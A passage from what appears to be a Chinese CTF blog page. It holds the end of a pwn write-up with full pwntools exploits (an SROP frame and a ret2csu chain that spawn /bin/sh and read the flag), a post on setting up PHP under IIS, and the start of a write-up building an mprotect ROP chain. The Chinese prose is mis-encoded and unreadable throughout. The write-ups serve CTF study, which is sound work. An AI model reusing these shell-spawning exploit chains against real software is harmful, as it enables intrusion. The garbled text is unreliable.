class="comment">#=================start=================#</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span></span><br><span class="line">payload += p64(mainAddr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stackAddr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x138</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(stackAddr))</span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = <span class="number">0x3b</span></span><br><span class="line">sigframe.rdi = stackAddr  <span class="comment"># &quot;/bin/sh&quot; &#x27;s addr</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stackAddr</span><br><span class="line">sigframe.rip = syscall_retAddr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">16</span>, <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">payload += p64(bdrAddr)</span><br><span class="line">payload += p64(syscall_retAddr)</span><br><span class="line">payload += <span class="built_in">bytes</span>(sigframe)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#=================End=================#</span></span><br><span class="line">p.sendline(<span class="built_in">next</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>å¯¹äºåè€…ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨execveï¼Œä¸ä½†è¦æŠŠrdiæŒ‡å‘binshåœ°å€ï¼Œè¿˜éœ€è¦å°†rsiå’Œrdxå…¨éƒ½ç½®0ï¼›</p>
<p><img src="/images/writeup/4/7.png" alt="7"></p>
<p>ROPgadgetæ— æ³•æ‰¾åˆ°rdxç›¸å…³çš„gadgetï¼ˆæ ¹æœ¬æ²¡æœ‰ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬é€‰æ‹©ä½¿ç”¨ret2csuï¼š</p>
<p><img src="/images/writeup/4/csu.png" alt="csu"></p>
<p>è¿™é‡Œå‚è€ƒäº†ä¸€ä¸‹<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bhxdn/p/12715671.html">è¿™ä¸ªwrite up</a>ï¼šæ³¨æ„è¿™é‡Œæ˜¯ediè€Œä¸æ˜¯rdiï¼Œ64ä½ä¼ å‚çš„åœ°å€éœ€è¦8ä½å¯„å­˜å™¨ï¼Œè¿™ä¸ªediæ˜¯ä¸å¤Ÿçš„ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦rdiæ¥ä¼ å‚ï¼š</p>
<p><img src="/images/writeup/4/8.png" alt="8"></p>
<p>ç¬¬äºŒä¸ªpayloadæ„é€ å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">2</span></span><br><span class="line">payload += p64(bdrAddr)</span><br><span class="line">payload += p64(csuEnd)</span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(stackAddr + <span class="number">0x10</span>)<span class="comment">#r12</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rdx</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#edi</span></span><br><span class="line">payload += p64(csuStart)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">payload += p64(rdiAddr)</span><br><span class="line">payload += p64(stackAddr)</span><br><span class="line">payload += p64(syscall_retAddr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>è¿™ç§ä¹Ÿå¯ä»¥æ‹¿åˆ°flagã€‚å®Œæ•´expï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">binary = <span class="string">&#x27;../ciscn_s_3&#x27;</span></span><br><span class="line">elf =ELF(binary)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">port = <span class="number">29144</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="built_in">next</span> = <span class="string">b&quot;ls &amp;&amp; cat flag&quot;</span></span><br><span class="line"><span class="comment">#==================rop==================#</span></span><br><span class="line">mainAddr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">bdrAddr = <span class="number">0x4004d7</span></span><br><span class="line">rdiAddr = <span class="number">0x00000000004005a3</span></span><br><span class="line"><span class="comment">#pop rdi;ret</span></span><br><span class="line">syscall_retAddr = <span class="number">0x0000000000400517</span></span><br><span class="line">csuStart = <span class="number">0x400580</span></span><br><span class="line">csuEnd = <span class="number">0x40059a</span></span><br><span class="line"><span class="comment">#=================start=================#</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span></span><br><span class="line">payload += p64(mainAddr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stackAddr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x138</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(stackAddr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> * <span class="number">2</span></span><br><span class="line">payload += p64(bdrAddr)</span><br><span class="line">payload += p64(csuEnd)</span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(stackAddr + <span class="number">0x10</span>)<span class="comment">#r12</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rdx</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#edi</span></span><br><span class="line">payload += p64(csuStart)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">payload += p64(rdiAddr)</span><br><span class="line">payload += p64(stackAddr)</span><br><span class="line">payload += p64(syscall_retAddr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#=================End=================#</span></span><br><span class="line">p.sendline(<span class="built_in">next</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/02/21/IIS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="FÃ¢tih'in Ä°stanbul'u fethettiÄŸi yaÅŸtasÄ±n!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de ĞĞ°Ğ·Ñ€Ğ¸Ğ½Ğ´Ğ°Ğº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/02/21/IIS/" class="post-title-link" itemprop="url">[CTF web] é€šè¿‡IISåœ¨Windowsä¸‹æ­å»ºphpç¯å¢ƒ</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-02-21 21:18:32" itemprop="dateCreated datePublished" datetime="2024-02-21T21:18:32+08:00">2024-02-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-25 22:30:45" itemprop="dateModified" datetime="2025-04-25T22:30:45+08:00">2025-04-25</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>CTFä¸­webæ–¹å‘çš„ä¸€å¤§é‡ç‚¹æ˜¯phpä»£ç å®¡è®¡ï¼Œè¿™éœ€è¦æˆ‘ä»¬å¯¹phpä»£ç çš„ç‰¹æ€§å¾ˆç†Ÿæ‚‰ï¼Œå¹¶äº†è§£åŸºæœ¬çš„phpè¯­æ³•ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦æœ‰ä¸€ä¸ªèƒ½å¤Ÿç»ƒä¹ å’Œç†Ÿæ‚‰phpçš„ç¯å¢ƒã€‚è€Œä¸”ï¼Œåœ¨æ„é€ åºåˆ—åŒ–ç­‰æ—¶å€™æˆ‘ä»¬ä¹Ÿéœ€è¦ä¸€ä¸ªèƒ½å¤Ÿè¿è¡Œphpçš„æœåŠ¡å™¨ã€‚æ¯”èµ·åœ¨çº¿ç¼–å†™ï¼Œæˆ‘ä»¬ä¸å¦‚ç›´æ¥åœ¨æœ¬åœ°æ­å»ºä¸€ä¸ªèƒ½å¤Ÿè§£é‡Šè¿è¡Œphpçš„æœåŠ¡å™¨ã€‚</p>
<p>ç»å¤§éƒ¨åˆ†äººç”µè„‘éƒ½æ˜¯ç”¨çš„Windowsï¼Œæˆ‘ä»¬å°±åˆ©ç”¨Windowsè‡ªå¸¦çš„IISåŠŸèƒ½æ¥æ­å»ºä¸€ä¸ªphpç¯å¢ƒ</p>
<h2 id="ç¬¬ä¸€æ­¥ï¼šå¼€å¯ç›¸åº”çš„WindowsåŠŸèƒ½"><a href="#ç¬¬ä¸€æ­¥ï¼šå¼€å¯ç›¸åº”çš„WindowsåŠŸèƒ½" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šå¼€å¯ç›¸åº”çš„WindowsåŠŸèƒ½"></a>ç¬¬ä¸€æ­¥ï¼šå¼€å¯ç›¸åº”çš„WindowsåŠŸèƒ½</h2><p>é¦–å…ˆæ‰“å¼€æ§åˆ¶é¢æ¿ï¼Œæœç´¢â€œå¯ç”¨æˆ–å…³é—­WindowsåŠŸèƒ½â€æ‰¾åˆ°è¿™ä¸ªç•Œé¢ï¼›</p>
<p><img src="/images/IIS/1.png" alt="IIS1"></p>
<p>æŠŠInternet Information Servicesä¸‹è¾¹çš„ç¬¬äºŒä¸ªç¬¬ä¸‰ä¸ªå‹¾ä¸Šï¼Œå¯ç”¨IISæœåŠ¡ï¼›</p>
<p>æ¥ç€æœç´¢IISæ‰¾åˆ°IISç®¡ç†å™¨ï¼š</p>
<p><img src="/images/IIS/2.png" alt="IIS2"></p>
<p>è¿™æ—¶å€™çœ‹çœ‹å³è¾¹çš„æ“ä½œæ ï¼Œå¦‚æœæ²¡æœ‰å¯åŠ¨å°±å¯åŠ¨ä¸€ä¸‹ï¼Œæ¥ç€è¿›å…¥ç½‘ç«™ï¼›</p>
<p><img src="/images/IIS/3.png" alt="IIS3"></p>
<p>IISé»˜è®¤è‡ªå¸¦ä¸€ä¸ªç½‘ç«™Defaul Web Siteï¼Œç»‘å®šçš„ç«¯å£æ˜¯80ã€‚åŒæ ·æ£€æŸ¥å³è¾¹çš„æ“ä½œæ å°†å…¶å¯åŠ¨ï¼Œæˆ‘ä»¬è®¿é—®127.0.0.1:80æˆ–localhost:80ï¼ŒæˆåŠŸçš„è¯ä¼šå‡ºç°è¿™æ ·ä¸€ä¸ªç•Œé¢ï¼š</p>
<p><img src="/images/IIS/4.png" alt="IIS4"></p>
<h2 id="ç¬¬äºŒæ­¥ï¼šæ·»åŠ phpæœåŠ¡"><a href="#ç¬¬äºŒæ­¥ï¼šæ·»åŠ phpæœåŠ¡" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šæ·»åŠ phpæœåŠ¡"></a>ç¬¬äºŒæ­¥ï¼šæ·»åŠ phpæœåŠ¡</h2><p>IISä¸­è‡ªå¸¦çš„æœåŠ¡åªæœ‰aspå’Œvbç­‰ï¼Œæ²¡æœ‰phpæœåŠ¡ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æ·»åŠ ï¼›</p>
<p><img src="/images/IIS/5.png" alt="IIS5"></p>
<p>è¿™é‡Œçš„æ·»åŠ è¿‡ç¨‹å‚è€ƒäº†<a href="%5BWindows+IIS+PHP%E2%80%94%E2%80%94PHP%E5%AE%89%E8%A3%85%E4%B8%8E%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE_php%E5%AE%89%E8%A3%85e%E7%9B%98,iis%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86%E5%8A%A8%E6%80%81%E5%86%85%E5%AE%B9-CSDN%E5%8D%9A%E5%AE%A2%5D(https://blog.csdn.net/weixin_43272781/article/details/101566707)">è¯¥åšå®¢</a>ï¼Œè¿‡ç¨‹æ¯”è¾ƒéº»çƒ¦ï¼Œä¸€æ­¥ä¸€æ­¥æ¥æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œå…ˆåœ¨å¤„ç†ç¨‹åºæ˜ å°„ä¸­æ·»åŠ phpï¼Œå†å¤„ç†php.ini,æœ€ç»ˆæˆåŠŸåœ¨IISä¸­æ·»åŠ äº†phpæœåŠ¡ã€‚</p>
<h2 id="ç¬¬ä¸‰æ­¥ï¼šæ„å»ºä¸ªäººç½‘ç«™æœåŠ¡"><a href="#ç¬¬ä¸‰æ­¥ï¼šæ„å»ºä¸ªäººç½‘ç«™æœåŠ¡" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šæ„å»ºä¸ªäººç½‘ç«™æœåŠ¡"></a>ç¬¬ä¸‰æ­¥ï¼šæ„å»ºä¸ªäººç½‘ç«™æœåŠ¡</h2><p>åœ¨ç½‘ç«™ç•Œé¢å³ä¾§æ·»åŠ ç½‘ç«™ï¼Œå‡ºç°è¯¥ç•Œé¢ï¼›</p>
<p><img src="/images/IIS/6.png" alt="IIS6"></p>
<p>åç§°ä»€ä¹ˆçš„éšä¾¿å¡«ï¼Œç‰©ç†è·¯å¾„æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼ˆä¹‹åçš„phpä»£ç å°±å¯ä»¥è¿™ä¸ªç›®å½•ä¸‹ç¼–å†™è°ƒè¯•ï¼‰ï¼Œç«¯å£ä¿è¯ä¸å†²çªéšä¾¿å¡«ï¼Œå…¶ä»–çš„é»˜è®¤å°±è¡Œï¼›</p>
<p>æ¥ä¸‹æ¥åœ¨è¯¥ç›®å½•æ·»åŠ æ–‡ä»¶index.phpï¼Œè¾“å…¥phpinfoï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>()</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è®¿é—®è®¾ç½®çš„ç«¯å£ï¼ˆæˆ‘çš„æ˜¯1437ï¼‰ï¼Œå‡ºç°è¯¥é¡µé¢è¯´æ˜æ²¡é—®é¢˜ï¼š</p>
<p><img src="/images/IIS/7.png" alt="IIS7"></p>
<p>æ¥ä¸‹æ¥å°±å¯ä»¥åœ¨è¯¥ç›®å½•ç¼–å†™ç»ƒä¹ phpäº†ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥åœ¨è¯¥ç›®å½•ä¸‹éšä¾¿æ·»åŠ phpæ–‡ä»¶å¹¶é€šè¿‡è¯¥ç«¯å£è®¿é—®ã€‚è§‰å¾—éº»çƒ¦å¯ä»¥ç›´æ¥åœ¨ç»ˆç«¯ç•Œé¢ä½¿ç”¨curlç›´æ¥è®¿é—®ã€‚ä¾‹å¦‚æˆ‘ä»¬åˆ›å»ºtest.phpï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello world&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ¥ç€åœ¨ç»ˆç«¯é”®å…¥ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:1437/test.php</span><br></pre></td></tr></table></figure>

<p>ä¾¿å¯ä»¥ç›´æ¥åœ¨ç»ˆç«¯å¾—åˆ°ç»“æœï¼Œååˆ†æ–¹ä¾¿ã€‚</p>
<p><img src="/images/IIS/8.png" alt="IIS8"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/02/21/writeup3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="FÃ¢tih'in Ä°stanbul'u fethettiÄŸi yaÅŸtasÄ±n!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de ĞĞ°Ğ·Ñ€Ğ¸Ğ½Ğ´Ğ°Ğº">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/02/21/writeup3/" class="post-title-link" itemprop="url">[ctfshow] pwn å†…éƒ¨èµ› flower write up</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-02-21 00:48:11" itemprop="dateCreated datePublished" datetime="2024-02-21T00:48:11+08:00">2024-02-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-19 00:12:10" itemprop="dateModified" datetime="2024-09-19T00:12:10+08:00">2024-09-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>ä»Šå¤©åšäº†ä¸€ä¸‹åˆçš„æ¯”è¾ƒå¤æ‚çš„é¢˜ï¼Œå†™ä¸€ä¸‹wpï¼Œä¸èƒ½ä¿è¯æ²¡æœ‰é”™è¯¯ï¼Œæ¬¢è¿å¤§å®¶æŒ‡å‡º</p>
<p>æ‹¿åˆ°é¢˜ç›®åä¸€å¼€å§‹è¿˜æ²¡æ„è¯†åˆ°æ˜¯èŠ±æŒ‡ä»¤æ··æ·†åæ±‡ç¼–ï¼Œç”¨pwndbgè°ƒè¯•äº†å¾ˆé•¿æ—¶é—´ï¼Œé—®äº†ç¾¤é‡Œçš„å¤§ä½¬æ‰æ„è¯†åˆ°è¿™ç‚¹ï¼Œäº‹å®ä¸Šflowerå·²ç»æš—ç¤ºäº†è¿™ä¸ªä¸ºèŠ±æŒ‡ä»¤æ··æ·†ï¼›</p>
<p>é¦–å…ˆfileå’Œchecksecä¸€ä¸‹ï¼š</p>
<p><img src="https://pic1.zhimg.com/80/v2-09a300ef6745694274091fd3d2eed160_1440w.webp" alt="file"></p>
<p><img src="https://pic3.zhimg.com/80/v2-c05f5e0e63fbb1e23244bfe06c6d87fe_1440w.webp" alt="checksec"></p>
<p>å‘ç°æ˜¯ä¸€ä¸ªé™æ€ç¼–è¯‘çš„64ä½ç¨‹åºï¼Œè€Œä¸”å¼€äº†NXå †æ ˆä¸å¯æ‰§è¡Œï¼›</p>
<p>é™æ€ç¼–è¯‘ç¨‹åºæ— åŠ¨æ€é“¾æ¥åº“ï¼Œret2libcæ˜¯è¡Œä¸é€šçš„ï¼Œè€ƒè™‘å†™å…¥shellcodeåret2shellcodeï¼›</p>
<p>æ‹–è¿›ida64ï¼Œ å‘ç°ida64é€†å‘å‡ºæ¥äº†ä¸€å †çœ‹ä¸æ‡‚çš„å¥‡æ€ªå‡½æ•°ï¼Œè€Œä¸”æ— æ³•æ‰¾åˆ°mainå‡½æ•°ï¼š</p>
<p><img src="https://pic1.zhimg.com/80/v2-dabbaed7fc1941c0bd3d7c8211a7bde8_1440w.webp"></p>
<p>é—®äº†é—®ç¾¤é‡Œçš„å¤§ä½¬ï¼Œè¯´æ˜¯è¿™ä¸ªä¸æ˜¯mainå‡½æ•°ï¼Œå…ˆè¿è¡Œä¸€ä¸‹çœ‹çœ‹ï¼š</p>
<p><img src="https://pic1.zhimg.com/80/v2-4753524a105f521701e3df62e2c9fc50_1440w.webp"></p>
<p>ç›´æ¥è¿è¡Œçœ‹ä¸Šå»å¾ˆæ­£å¸¸ï¼Œå»idaé‡Œæ‰¾å­—ç¬¦ä¸²ï¼š</p>
<p><img src="https://pic3.zhimg.com/80/v2-ce3968b8a0811c90f53eb147d1d9a722_1440w.webp"></p>
<p>æ ¹æ®å­—ç¬¦ä¸²æ‰¾äº¤å‰å¼•ç”¨ï¼Œå‘ç°äº†æ²¡æœ‰è¢«åæ±‡ç¼–çš„mainå‡½æ•°ï¼š</p>
<p><img src="https://pic1.zhimg.com/80/v2-96325811abb969183a2fc2beec97f594_1440w.webp" alt="ctrl+xäº¤å‰å¼•ç”¨"></p>
<p>è¿™é‡Œè¢«æ ‡çº¢è¯´æ˜æœ‰é—®é¢˜ï¼Œæ³¨æ„è¿™é‡Œçš„jzå’Œjnzï¼š</p>
<p><img src="https://pic4.zhimg.com/80/v2-b3922739d1d49221fd164db92d5a49eb_1440w.webp"></p>
<p>jzå’ŒjnzæŒ‡å‘äº†åŒä¸€ä¸ªåœ°å€ï¼Œè¯´æ˜æ— è®ºZFæ˜¯ä½•å€¼éƒ½ä¼šè·³è½¬ï¼Œä¸”å¤¹åœ¨ä¸­é—´çš„æŒ‡ä»¤ä¸ºæ­»æŒ‡ä»¤ï¼Œä¸ä¼šè¢«æ‰§è¡Œï¼Œ</p>
<p>æˆ‘ä»¬æŠŠè¿™ä¸¤ä¸ªåœ°å€ä¹‹é—´çš„æŒ‡ä»¤å…¨æ”¹æˆ0x90(nop)ï¼š</p>
<p><img src="https://pic4.zhimg.com/80/v2-def6883a3fa4899cdd80b2daa615c77b_1440w.webp"></p>
<p>å»mainä¸ŠæŒ‰pé‡æ–°ç”Ÿæˆå‡½æ•°ï¼š</p>
<p><img src="https://pic3.zhimg.com/80/v2-e10fb60b76f6691a98c39995130b36fa_1440w.webp"></p>
<p>å‘ç°è¿˜æœ‰ä¸€æ®µæ²¡æœ‰æ¥ä¸Šï¼›</p>
<p>è¿™æ—¶åˆ é™¤ä¸‹è¾¹é‚£ä¸ª400A30å‡½æ•°ï¼ŒæŠŠmainçš„ç»“æŸåœ°å€æ”¾åˆ°400A74ï¼š</p>
<p><img src="https://pic1.zhimg.com/80/v2-a7c21d420dd1aba4eb4544c5a730ee9c_1440w.webp"></p>
<p><img src="https://pic4.zhimg.com/80/v2-e7631db945d64202ca1da38f279ad523_1440w.webp"></p>
<p>æˆåŠŸåˆå¹¶æ‹¿åˆ°çœŸæ­£çš„mainå‡½æ•°ï¼š</p>
<p><img src="https://pic3.zhimg.com/80/v2-807d1ad68b3e21034197a4b67ce3a06a_1440w.webp" alt="main"></p>
<p>è¿™æ ·å°±èƒ½å¤Ÿæ¥ç€æ­£å¸¸åˆ†æäº†ã€‚</p>
<p>å…ˆçœ‹è¾“å…¥ï¼šç¬¬ä¸€ä¸ªscanfæ¥å—ä¸€ä¸ª%dæ•´æ•°ï¼Œæ²¡æœ‰ä»€ä¹ˆæº¢å‡ºç‚¹ï¼Œä¸è¿‡ç¨‹åºé™åˆ¶äº†v9çš„å¤§å°ä¸èƒ½è¶…è¿‡10ï¼›è€Œä¸‹ä¸€ä¸ªreadä¼šå°†è¯»å…¥v9ä¸ªæ•°æ®ï¼Œç¨‹åºæƒ³é€šè¿‡è¿™ç§æ–¹å¼é™åˆ¶è¾“å…¥é‡ã€‚</p>
<p>äº‹å®ä¸Šï¼Œæ³¨æ„v9(unsigned int)å’Œ(int)çš„ç±»å‹è½¬æ¢ï¼Œæˆ‘ä»¬å¯ä»¥éšä¾¿è¾“å…¥è´Ÿæ•°æ¥ç»•è¿‡æ£€æŸ¥æ¥å‡ ä¹æ— é™åˆ¶åœ°è¯»å–æ•°æ®ï¼›</p>
<p>æ‰€ä»¥ç¬¬ä¸€æ­¥ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;-22&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å°è¯•æ ˆæº¢å‡ºã€‚å‰æ–‡æåˆ°è¿‡ret2shellcodeï¼Œæˆ‘ä»¬å…ˆå¯»æ‰¾ä¸€ä¸‹å¯è¯»å¯å†™å¯æ‰§è¡Œçš„åœ°å€ï¼š</p>
<p><img src="https://pic2.zhimg.com/80/v2-9382ac7c968722b940cd14bba21b2c29_1440w.webp" alt="pwndbgä¸‹vmmap"></p>
<p>å‘ç°æ²¡æœ‰åˆé€‚çš„æ®µï¼Œè¿™æ—¶å¯»æ‰¾èƒ½æ”¹å˜æƒé™çš„å‡½æ•°mprotectï¼š</p>
<p><img src="https://pic2.zhimg.com/80/v2-fcfdb09b8c159f6b1627070cf66e9dd9_1440w.webp" alt="mprotect"></p>
<p>è¯¥å‡½æ•°çš„åº”ç”¨åœ¨ç½‘ä¸Š<a target="_blank" rel="noopener" href="https://firmianay.gitbook.io/ctf-all-in-one/4_tips/4.11_mprotect#li-ti">æŸ¥äº†æŸ¥</a>ï¼Œéœ€è¦ä¸‰ä¸ªå‚æ•°ï¼ŒROPgadgetä¸€ä¸‹å‘ç°pop rdiï¼Œrsiï¼Œrdxéƒ½èƒ½æ‰¾åˆ°ï¼š</p>
<p><img src="https://pic4.zhimg.com/80/v2-b7e78b3b44ecef95607b6e15c008b633_1440w.webp" alt="rdi"></p>
<p><img src="https://pic2.zhimg.com/80/v2-339f72fefd8bd09dec5e3782545b1ea5_1440w.webp" alt="rsi"></p>
<p><img src="https://pic2.zhimg.com/80/v2-67d3ec6178e751b66b3018083172d67d_1440w.webp" alt="rdx"></p>
<p>v8åœ¨æ ˆä¸Šæœ‰0x50ä¸ªç©ºé—´ï¼Œæ¥ä¸‹æ¥å¼€å§‹æ„é€ payloadçš„ç¬¬ä¸€éƒ¨åˆ†ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">88</span></span><br><span class="line">payload += p64(rdiAddr)</span><br><span class="line">payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">payload += p64(rsiAddr)</span><br><span class="line">payload += p64(<span class="number">0x1024</span>)</span><br><span class="line">payload += p64(rdxAddr)</span><br><span class="line">payload += p64(<span class="number">0x7</span>)</span><br><span class="line">payload += p64(mprotectPlt)</span><br></pre></td></tr></table></figure>

